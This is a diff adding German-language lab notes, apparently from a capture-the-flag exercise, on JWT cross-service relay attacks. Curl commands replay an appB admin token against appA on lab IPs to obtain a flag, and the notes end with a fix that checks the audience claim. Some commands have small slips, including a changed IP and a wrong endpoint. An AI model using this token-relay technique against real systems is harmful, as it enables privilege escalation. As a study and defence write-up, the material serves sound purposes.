@@ -379,3 +379,87 @@ payload = {
 
 access_token = jwt.encode(payload, self.secret, algorithm="HS256")
 ```
+
+
+# Cross-Service Relay Attacks
+
+Wie bereits erwähnt, werden JWTs häufig in Systemen mit einem zentralisierten Authentifizierungssystem verwendet, das mehrere Anwendungen bedient. In einigen Fällen kann es jedoch sinnvoll sein, den Zugriff auf bestimmte Anwendungen mit einem JWT zu beschränken, insbesondere wenn es Claims gibt, die nur für bestimmte Anwendungen gültig sein sollten. Dies kann mithilfe des Audience-Claims erreicht werden. Wenn der Audience-Claim jedoch nicht korrekt durchgesetzt wird, kann ein Cross-Service-Relay-Angriff ausgeführt werden, um eine Privilegieneskalation durchzuführen.
+
+## The Audience Claim
+
+JWTs können einen Zielgruppen-Claim haben. In Fällen, in denen ein einziges Authentifizierungssystem mehrere Anwendungen bedient, kann der Zielgruppen-Claim angeben, für welche Anwendung das JWT bestimmt ist. Die Durchsetzung dieses Zielgruppen-Claims muss jedoch auf der Anwendung selbst erfolgen, nicht auf dem Authentifizierungsserver. Wenn dieser Claim nicht überprüft wird, kann dies unbeabsichtigte Folgen haben, da der JWT selbst durch die Signaturüberprüfung weiterhin als gültig angesehen wird.
+
+Ein Beispiel hierfür ist, wenn ein Benutzer über Administratorrechte oder eine höhere Rolle in einer bestimmten Anwendung verfügt. Der dem Benutzer zugewiesene JWT enthält in der Regel einen Claim, der dies angibt, z. B. „admin” : true. Derselbe Benutzer ist jedoch möglicherweise kein Administrator für eine andere Anwendung, die vom selben Authentifizierungssystem bedient wird. Wenn der Claim „Audience“ in dieser zweiten Anwendung, die ebenfalls den Claim „admin“ verwendet, nicht überprüft wird, kann der Server fälschlicherweise annehmen, dass der Benutzer über Administratorrechte verfügt. Dies wird als Cross-Service-Relay-Angriff bezeichnet.
+
+## Praktisches Beispiel 
+
+Wir haben 2 Ziele appA und appB via 
+ http://10.10.207.144/api/v1.0/example7_appA
+ 
+ http://10.10.207.144/api/v1.0/example7_appB
+
+Wir haben Creds user für beide APIs 
+
+#### Versuch 1
+Plan: 
+Melden uns bei appA an und holen uns den Token und Verifizieren diesen. Danach versuchen wir uns damit bei appB anzumelden und schauen uns den Token an 
+
+Anmeldung bei appA
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appA"}' http://10.10.27.245/api/v1.0/example7
+```
+
+Verifizierung bei appA:
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.10.27.245/api/v1.0/example7_appA?username=admin
+```
+Verifizierung erfolgreich 
+
+Anmelde versuch mit dem Token von appA bei appB
+
+```
+curl -H 'Authorization: Bearer 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MCwiYXVkIjoiYXBwQSJ9.sl-84cMLYjxsD7SCySnnv3J9AMII9NKgz0-0vcak9t4' http://10.10.27.245/api/v1.0/example7_appA?username=admin
+```
+Fehlermeldung: audience is incorrect.
+
+->  Daraus können wir schließen das appB nach dem Audiance Claim Kontrolliert
+
+### Versuch 2
+Plan: 
+Wir melden uns bei appB mit unseren Creds an und Verifizieren danach den Token. Danach Versuchen wir den Token bei appB um zu schauen ob dort der Audiance Claim geprüft wird
+
+Anmelden bei appB
+
+```
+curl -H 'Content-Type: application/json' -X POST -d '{ "username" : "user", "password" : "password7", "application" : "appB"}' http://10.10.27.245/api/v1.0/example7
+```
+
+Verifizierung des Tokens für appB
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.27.245/api/v1.0/example7_appB?username=admin
+```
+
+Verifizierung Erfolgreich. 
+
+Test ob appA nach dem Audiance Claim Checkt: 
+
+```
+curl -H 'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJhZG1pbiI6MSwiYXVkIjoiYXBwQiJ9.jrTcVTGY9VIo-a-tYq_hvRTfnB4dMi_7j98Xvm-xb6o' http://10.10.27.245/api/v1.0/example7_appA?username=admin
+```
+
+Erfolg appA checkt nur die Signatur und nicht den Audiance claim -> Flag erhalten
+
+
+## Dev Fehler: 
+
+Das Hauptproblem besteht darin, dass der Claim in AppA nicht überprüft wird. Dies kann daran liegen, dass die Überprüfung des Claims deaktiviert wurde oder dass der Claim-Umfang zu weit gefasst ist.
+
+## Fix
+The audience claim should be verified when the token is decoded. This can be done as shown in the example below:
+
+```
+payload = jwt.decode(token, self.secret, audience=["appA"], algorithms="HS256")
+```
